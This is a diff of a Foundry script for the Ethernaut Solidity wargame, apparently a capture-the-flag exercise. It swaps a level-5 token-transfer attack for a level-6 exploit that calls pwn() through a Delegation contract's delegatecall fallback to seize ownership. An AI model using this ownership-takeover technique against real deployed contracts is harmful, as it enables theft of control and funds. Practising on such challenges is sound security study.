@@ -2,23 +2,20 @@
 pragma solidity ^0.8.0;
 
 import {Script} from "lib/forge-std/src/Script.sol";
-import {Token} from "../src/ethernaut5.sol";
+import {Delegation} from "src/ethernaut6.sol";
 import {console} from "lib/forge-std/src/console.sol";
 
-contract ethernaut5Script is Script{
+contract ethernaut6Script is Script{
+    Delegation instance = Delegation(0x77BAdD4BA7e3481BF3516339295f031ac0384212);
     function run() public{
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         
-        new attackScript();
+        console.log("owner: ", instance.owner());
+        bytes memory data = abi.encodeWithSignature("pwn()");
+        (bool success,) = address(instance).call(data);
+        require(success, "pwn failed");
+        console.log("owner: ", instance.owner());
 
         vm.stopBroadcast();
-    }
-}
-contract attackScript{
-    Token instance = Token(payable(0x102dD7711A2bec7A661f6aB3597D2a1178475A79));
-    constructor() public{
-        console.log(instance.balanceOf(0xbf2B63cCeE4d24F63c138b6a9b82ef14f6793779));
-        instance.transfer(0xbf2B63cCeE4d24F63c138b6a9b82ef14f6793779, 100);
-        console.log(instance.balanceOf(0xbf2B63cCeE4d24F63c138b6a9b82ef14f6793779));
     }
 }
